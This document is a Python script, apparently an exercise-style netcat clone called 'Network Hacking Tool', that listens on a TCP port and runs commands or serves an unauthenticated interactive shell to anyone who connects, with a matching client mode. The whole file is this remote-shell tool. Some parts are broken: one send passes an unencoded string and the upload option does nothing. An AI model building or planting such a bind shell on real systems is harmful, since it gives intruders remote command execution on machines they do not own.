import argparse
import shlex
import socket
import subprocess
import sys
import textwrap
import threading

class NetHack:
    def __init__(self):
        self.manual()
        self.host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def manual(self):
        parser = argparse.ArgumentParser(
            description="Network Hacking Tool",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog=textwrap.dedent(
                """
                Examples:
                (1) ./nethack2.py -t <ip> -p <port> -l -e <command>
                \t\t-> Listen on <ip>:<port> and execute command.
                (2) ./nethack2.py -t <ip> -p <port> -l -s
                \t\t-> Listen on <ip>:<port> and open shell.
                (3) ./nethack2.py -t <ip> -p <port> -l -u <filename>
                \t\t-> Listen on <ip>:<port> and upload <filename>.
                (4) ./nethack2.py -t <ip> -p <port>
                \t\t-> Connect on <ip>:<port>.
                (5) <data> | ./nethack2.py -t <ip> -p <port>
                \t\t-> Send data to <ip>:<port>. 
                """
            )
        )
        parser.add_argument(
            "-t", "--target",
            action="store", type=str,
            help="IP Address"
        )
        parser.add_argument(
            "-p", "--port",
            action="store", type=int,
            help="Port Number"
        )
        parser.add_argument(
            "-l", "--listen",
            action="store_true",
            help="Listen" 
        )
        parser.add_argument(
            "-e", "--execute",
            action="store", type=str,
            help="Execute command"
        )
        parser.add_argument(
            "-s", "--shell",
            action="store_true",
            help="Open shell"
        )
        parser.add_argument(
            "-u", "--upload",
            action="store", type=str,
            metavar="FILE",
            help="Upload file"
        )
        self.args = parser.parse_args()

    def createServer(self):
        self.host.bind((self.args.target, self.args.port))
        self.host.listen(5)
        print(f"[*] Server is listening on {self.args.target}:{self.args.port}")
        while True:
            client, conn = self.host.accept()
            thread = threading.Thread(
                target=self._clientHandler, args=(client,)
            )
            thread.start()

    def _clientHandler(self, client):
        client.send("[*] Connected to the server.\n".encode())
        if self.args.execute:
            client.send("[*] Press enter to see output.")
            output = self.execute()
            client.send(output)
            client.close()
        elif self.args.shell:
            self.shell(client)
        elif self.args.upload:
            pass

    def _recvData(self, host):
        buffer = b""
        length = 2048
        while True:
            data = host.recv(length)
            buffer += data
            if len(data) < length:
                break
        return buffer

    def execute(self, cmd=None):
        if cmd == None:
            cmd = self.args.execute
        print(f"[*] Execute \"{cmd}\"")
        output = subprocess.check_output(
            shlex.split(cmd),
            stderr=subprocess.STDOUT
        )
        return output

    def shell(self, host):
        while True:
            host.send("NetHack ~> ".encode())
            cmd = self._recvData(host).decode()
            output = self.execute(cmd)
            host.send(output)

    def createClient(self):
        self.host.connect((self.args.target, self.args.port))
        while True:
            data = self._recvData(self.host)
            print(data.decode(), end="")
            cmd = input()
            self.host.send(cmd.encode())
    
    def run(self):
        if self.args.listen:
            self.createServer()
        else:
            self.createClient()



def main():
    if __name__ == "__main__":
        nethack = NetHack()
        nethack.run()

main()